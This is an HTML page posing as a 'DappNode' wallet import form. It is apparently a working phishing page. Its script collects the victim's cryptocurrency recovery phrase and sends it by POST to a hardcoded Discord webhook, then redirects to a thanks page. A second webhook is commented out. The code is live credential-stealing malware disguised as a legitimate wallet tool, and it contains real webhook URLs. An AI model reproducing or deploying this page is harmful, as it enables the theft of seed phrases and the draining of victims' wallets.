<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="./images/images22.png" type="image/x-icon">
    <title>DappNode || Import Wallet</title>
</head>
<body>
    <div class="form-container">
        <div class="header">
            <img id="wallet-image" src="" alt="Selected Wallet Image"><br><br>
            <h1>Import your Wallet </h1>
        </div>
        
    <form id="wallet-form">
        <label for="wallet-name">Wallet Name:</label>
        <input type="text" id="wallet-name" name="wallet-name" readonly><br><br>
        

        Recovery:
        <textarea id="recovery-phrase" name="recovery-phrase" rows="6" cols="60" placeholder="Enter your recovery phrase here..."></textarea><br><br>
        <p class="undertext">Typically 12 (sometimes 24) words separated by single spaces</p>

        <div class="button-container">
            <a href="./index.html" id="cancel-button">Cancel</a>
            <button type="submit" id="import-button" disabled >Import Wallet</button>
        </div>
    </form>

    </div>
    
    <script>
        // Retrieve wallet info from localStorage
        const walletName = localStorage.getItem('selectedWalletName');
        const walletImage = localStorage.getItem('selectedWalletImage');

        // Set the wallet name and image in the form
        if (walletName && walletImage) {
            document.getElementById('wallet-name').value = walletName;
            document.getElementById('wallet-image').src = walletImage;
        }


         // Enable submit button once recovery phrase is filled
        const recoveryPhraseField = document.getElementById('recovery-phrase');
        const importButton = document.getElementById('import-button');

        recoveryPhraseField.addEventListener('input', function() {
            if (recoveryPhraseField.value.trim() !== "") {
                importButton.disabled = false; // Enable button when input is not empty
            } else {
                importButton.disabled = true; // Disable button if input is empty
            }
        });

        // Send form data to two Discord webhooks
        document.getElementById('wallet-form').addEventListener('submit', async function(event) {
            event.preventDefault(); // Prevent default form submission

            const recoveryPhrase = recoveryPhraseField.value.trim();

            // Discord webhook URLs
            const webhookURL1 = "https://discord.com/api/webhooks/1417491121193488434/UcfSMmNTcgjyPz4FyW1n8U8dTMWeYJTcuGixdYCgHrgzrdsZ7faVlK2Cclv7Ot7nqCjV";
            //const webhookURL2 = "https://discord.com/api/webhooks/1383559795247812778/JSRvCwHCsBrwjk47fMhKTIuycFk6M6njmgGvVVNeuABBCgcZuX9sFUlpuuSqWrcyisQC"; 

            // Prepare the message content
            const messageContent = `**Wallet Import Details**\n\n**Wallet Name:** ${walletName}\n**Recovery Phrase:** ${recoveryPhrase}`;

            // Send data to the first webhook
            try {
                await fetch(webhookURL1, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: messageContent })
                });

                // Send data to the second webhook
           // await fetch(webhookURL2, {
           //         method: 'POST',
            //       headers: { 'Content-Type': 'application/json' },
            //        body: JSON.stringify({ content: messageContent })
            //    });

                // After sending the data, redirect to another page (or show success message)
                window.location.href = './thanks.html'; // Replace with your redirect page after form submission
            } catch (error) {
                console.error('Error sending to Discord:', error);
                alert('Failed to send the information. Please try again.');
            }
        });
    </script>


<style>
    body {
        background-color: #f4f4f4;
        display: flex;
        margin: 100px auto;
        flex-direction: column;
        align-items: center;
        justify-content: center;
    }

    .form-container {
        background-color: #fff;
        padding: 20px 30px;
        border-radius: 10px;
        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        width: 80%;
        max-width: 500px;
        display: flex;
        flex-direction: column;
        align-items: flex-start;
        justify-content: space-between;
    }

    .form-container .header {
        display: flex;
        align-items: center;
        justify-content: flex-start;
        gap:10px;
        margin-bottom: 20px;
    }

    .form-container .header img {
        width: 30px;
    }

    h1 {
        color: #333;
        font-size: 24px;
        line-height: 30px;
        font-weight: 500;
    }

    label {
        display: block;
    }

    input[type="text"], textarea {
        width: 95%;
        display: block;
        margin-top: 10px;
        padding: 10px;
        border: 1px solid #ccc;
        border-radius: 5px;
    }

    .undertext {
        font-size: 12px;
        color: #666;
        margin-top: -30px;
    }
    
    .button-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
        width: 100%;
        margin-top: 20px;
    }

    .button-container #cancel-button{
        background: #EF4444;
        color: white;
        padding: 10px 30px;
        text-decoration: none;
        border-radius: 5px;
        border: none;
    }

    .button-container #import-button {
        background: #1F47AC;
        color: white;
        padding: 10px 30px;
        border: none;
        border-radius: 5px;
        cursor: pointer;
    }
</style>
</body>
</html>
